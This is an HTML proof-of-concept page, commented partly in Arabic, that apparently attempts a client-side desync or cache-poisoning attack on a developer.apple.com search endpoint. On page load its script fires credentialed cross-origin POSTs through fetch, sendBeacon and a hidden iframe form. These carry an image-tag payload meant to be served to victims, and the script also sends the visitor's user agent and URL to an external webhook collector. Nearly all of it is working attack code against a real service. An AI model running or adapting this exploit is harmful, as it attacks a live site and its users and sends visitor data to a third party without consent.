<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Apple Developer Client-Side Desync PoC</title>
  <meta name="referrer" content="no-referrer" />
  <style>
    body { font-family: system-ui, Arial, sans-serif; margin: 24px; line-height: 1.3; }
    h1 { margin: 0 0 8px; }
    code, pre { background:#f6f8fa; padding:8px 10px; border-radius:6px; display:block; }
    .ok{color:#0a0}
    .warn{color:#a60}
    .err{color:#b00}
    .muted{opacity:.75}
  </style>
</head>
<body>
  <h1>Apple Developer Client-Side Desync PoC</h1>
  <p>This page sends a crafted request to the target endpoint and attempts a CSP bypass beacon. We use multiple cross-origin techniques so the request is <em>sent</em> even if the response is not readable due to CORS.</p>
  <p class="muted">Target: <code id="tg"></code></p>
  <pre id="log">Running PoC…</pre>

  <!-- طريقة 3: نموذج POST إلى iFrame مخفي (الأضمن لإرسال الطلب) -->
  <iframe name="sink" style="display:none;"></iframe>
  <form id="pocForm" target="sink" method="POST">
    <input type="hidden" name="payload" id="payloadInput" value="">
  </form>

  <script>
    // === إعدادات ===
    const WEBHOOK = "https://webhook.site/76de3122-9fc0-47d9-844c-1fb847ba7133";
    const TARGET  = "https://developer.apple.com/search/services/v1/quick-links/"; // endpoint المصاب
    document.getElementById("tg").textContent = TARGET;

    // حمولة بيكون بسيطة: <img> سيؤدي تلقائياً إلى hit على الـ Webhook إذا عُرضت كـ HTML لدى الضحية
    const beaconHTML = `<img src="${WEBHOOK}?poc=apple_test" alt="x">`;

    // أدوات عرض
    function log(msg, cls="") {
      const el = document.getElementById("log");
      el.innerHTML += `\n${cls ? '' : ''}${msg}`;
      console[cls==="err" ? "error" : "log"](msg);
    }

    // خطوة A: fetch no-cors (قد يرفضها المتصفح/السيرفر — هي محاولة أولى فقط)
    async function tryFetchNoCors() {
      try {
        await fetch(TARGET, {
          method: "POST",
          mode: "no-cors", // يرسل الطلب لكن لن نقرأ الرد
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: "payload=" + encodeURIComponent(beaconHTML),
          credentials: "include"
        });
        log("✅ fetch(no-cors) sent (response is opaque due to CORS).", "ok");
        return true;
      } catch (e) {
        log("⚠️ fetch(no-cors) failed: " + e, "warn");
        return false;
      }
    }

    // خطوة B: sendBeacon (لا يقرأ الرد، لكنه يرسل POST موثوق غالباً)
    function trySendBeacon() {
      try {
        const ok = navigator.sendBeacon(TARGET, `payload=${encodeURIComponent(beaconHTML)}`);
        if (ok) {
          log("✅ navigator.sendBeacon sent.", "ok");
          return true;
        } else {
          log("⚠️ navigator.sendBeacon returned false (browser declined).", "warn");
          return false;
        }
      } catch (e) {
        log("⚠️ navigator.sendBeacon failed: " + e, "warn");
        return false;
      }
    }

    // خطوة C: form POST إلى iframe مخفي (cross-origin submit — لا يعتمد على CORS للقراءة)
    function submitHiddenForm() {
      try {
        const form = document.getElementById("pocForm");
        const input = document.getElementById("payloadInput");
        form.action = TARGET;
        input.value = beaconHTML;
        form.submit();
        log("✅ Hidden <form> POST submitted to target (in hidden iframe).", "ok");
        return true;
      } catch (e) {
        log("❌ Hidden <form> submit failed: " + e, "err");
        return false;
      }
    }

    // Proof marker إلى Webhook (غير حساس)
    function sendProof() {
      const proof = {
        target: TARGET,
        proof: "Apple Unified PoC",
        when: new Date().toISOString(),
        ua: navigator.userAgent,
        page: location.href
      };
      fetch(WEBHOOK, {
        method: "POST",
        mode: "no-cors",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(proof)
      });
      log("📤 Proof beacon sent to webhook (non-sensitive).", "ok");
    }

    (async function run() {
      log("PoC initialized. Preparing cross-origin sends…");
      sendProof();

      const a = await tryFetchNoCors();
      const b = trySendBeacon();
      const c = submitHiddenForm();

      if (!a && !b && !c) {
        log("❌ All send attempts failed in this browser. Try another browser/profile.", "err");
      } else {
        log("ℹ️ Check your Webhook for beacons when/if the payload is reflected or served from cache.", "warn");
      }
      log("Done.");
    })();
  </script>
</body>
</html>
